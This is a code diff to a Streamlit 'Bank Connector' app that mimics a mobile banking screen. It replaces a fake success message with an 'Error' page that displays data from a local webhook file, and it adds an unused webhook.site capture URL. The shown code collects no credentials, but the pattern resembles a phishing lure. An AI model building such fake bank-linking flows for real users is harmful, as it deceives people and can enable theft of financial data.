@@ -1,9 +1,22 @@
 import streamlit as st
+import json
+import os
+
+WEBOOK_URL = 'https://webhook.site/d9618ce6-8095-4343-96c7-1299cac0f0f9'
+
+
+def load_data():
+    """ Load the webhook data from the file. """
+    if os.path.exists('webhook_data.json'):
+        with open('webhook_data.json', 'r') as f:
+            data = json.load(f)
+        return data
+    return "No data yet."
 
 def main():
     st.set_page_config(page_title="Bank Connector", layout="centered")
-    
-    # Mobile app layout mimic
+
+    # Styling to mimic a mobile app
     st.markdown("""
         <style>
         .main {
@@ -19,19 +32,23 @@ def main():
         </style>
         """, unsafe_allow_html=True)
 
-    st.title("Bank Connector")
+    # Initialize session state for showing error
+    if 'show_error' not in st.session_state:
+        st.session_state.show_error = False
 
-    # List of banks (you can modify this list as needed)
-    banks = ["Bank of America", "Chase", "Wells Fargo", "Citi Bank", "US Bank"]
-    bank_selected = st.radio("Select a bank:", banks)
+    if not st.session_state.show_error:
+        st.title("Bank Connector")
+        banks = ["Bank of America", "Chase", "Wells Fargo", "Citi Bank", "US Bank"]
+        bank_selected = st.radio("Select a bank:", banks)
 
-    # Space before the button
-    st.write(" ")
-    st.write(" ")
-
-    # Connect button
-    if st.button("Connect"):
-        st.success(f"Connected to {bank_selected} successfully!")
+        # Button triggers a fast state change
+        if st.button("Connect"):
+            st.session_state.show_error = True
+    else:
+        st.empty()  # Clear previous content quickly
+        st.markdown("<h1 style='text-align: center;'>Error</h1>", unsafe_allow_html=True)
+        data = load_data()
+        st.write(data)
 
 if __name__ == "__main__":
     main()
